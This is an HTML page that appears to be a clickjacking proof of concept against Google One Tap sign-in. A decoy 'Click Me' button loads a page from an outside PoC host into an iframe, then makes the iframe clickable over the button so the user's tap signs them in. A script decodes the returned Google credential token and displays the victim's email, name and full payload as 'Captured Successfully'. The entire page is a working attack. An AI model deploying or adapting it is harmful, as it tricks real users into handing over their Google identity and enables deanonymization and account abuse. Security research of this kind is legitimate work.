<!doctype html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"
    />
    <title>test123</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        -webkit-touch-callout: none;
        -webkit-user-select: none;
        user-select: none;
      }
      body {
        font-family: Roboto, Arial, sans-serif;
        padding: 20px;
        background: #f5f5f5;
        touch-action: manipulation;
      }
      h1 {
        margin-bottom: 20px;
        font-size: 24px;
        color: #333;
      }
      .btn-wrapper {
        position: relative;
        width: 100%;
        max-width: 350px;
        height: 70px;
        margin: 20px 0;
      }
      #mainBtn {
        width: 100%;
        height: 100%;
        background: #1a73e8;
        color: #fff;
        border: none;
        border-radius: 8px;
        font-size: 18px;
        cursor: pointer;
        position: relative;
        z-index: 1;
        touch-action: manipulation;
        font-weight: 600;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        -webkit-tap-highlight-color: transparent;
      }
      #mainBtn:active {
        transform: scale(0.98);
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
      }
      #gotFrame {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: none;
        pointer-events: none;
        opacity: 0;
        z-index: 2;
      }
      #result {
        margin-top: 20px;
        padding: 15px;
        background: #fff;
        border-radius: 8px;
        display: none;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      }
    </style>
  </head>
  <body>
    <h1>Please click button here</h1>
    <div class="btn-wrapper">
      <button id="mainBtn">Click Me</button> <iframe id="gotFrame"></iframe>
    </div>
    <div id="result"></div>
    <script>
      const gotFrame = document.getElementById("gotFrame");
      const mainBtn = document.getElementById("mainBtn");
      const result = document.getElementById("result");
      let loaded = false;
      let touchHandled = false;
      const parseJWT = (jwt) => {
        try {
          const base64Url = jwt.split(".")[1];
          const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
          const jsonPayload = decodeURIComponent(
            atob(base64)
              .split("")
              .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
              .join(""),
          );
          return JSON.parse(jsonPayload);
        } catch (e) {
          return null;
        }
      };
      window.addEventListener("message", (e) => {
        if (e.data && e.data.credential) {
          const payload = parseJWT(e.data.credential);
          if (payload) {
            result.style.display = "block";
            result.innerHTML =
              '<h3 style="color:#28a745;margin-bottom:10px">âœ“ Captured Successfully</h3><p style="margin:5px 0"><strong>Email:</strong> ' +
              payload.email +
              '</p><p style="margin:5px 0"><strong>Name:</strong> ' +
              (payload.name || "N/A") +
              '</p><details style="margin-top:10px"><summary style="cursor:pointer">View Full Data</summary><pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow:auto;font-size:12px;margin-top:10px">' +
              JSON.stringify(payload, null, 2) +
              "</pre></details>";
          }
        }
      });
      const loadFrame = () => {
        if (loaded) return;
        loaded = true;
        gotFrame.src =
          "https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html";
        setTimeout(() => {
          gotFrame.style.opacity = "10000000";
          gotFrame.style.pointerEvents = "auto";
          mainBtn.style.pointerEvents = "none";
        }, 450);
      };
      mainBtn.addEventListener(
        "touchstart",
        (e) => {
          if (!touchHandled) {
            touchHandled = true;
            loadFrame();
          }
        },
        { passive: true },
      );
      mainBtn.addEventListener(
        "touchend",
        (e) => {
          e.preventDefault();
          if (!loaded) {
            loadFrame();
          }
        },
        { passive: false },
      );
      mainBtn.addEventListener("click", (e) => {
        e.preventDefault();
        if (!loaded) {
          loadFrame();
        }
      });
      document.addEventListener("DOMContentLoaded", () => {
        setTimeout(loadFrame, 1500);
      });
      window.addEventListener("focus", () => {
        if (!loaded) {
          setTimeout(loadFrame, 500);
        }
      });
    </script>
  </body>
</html>
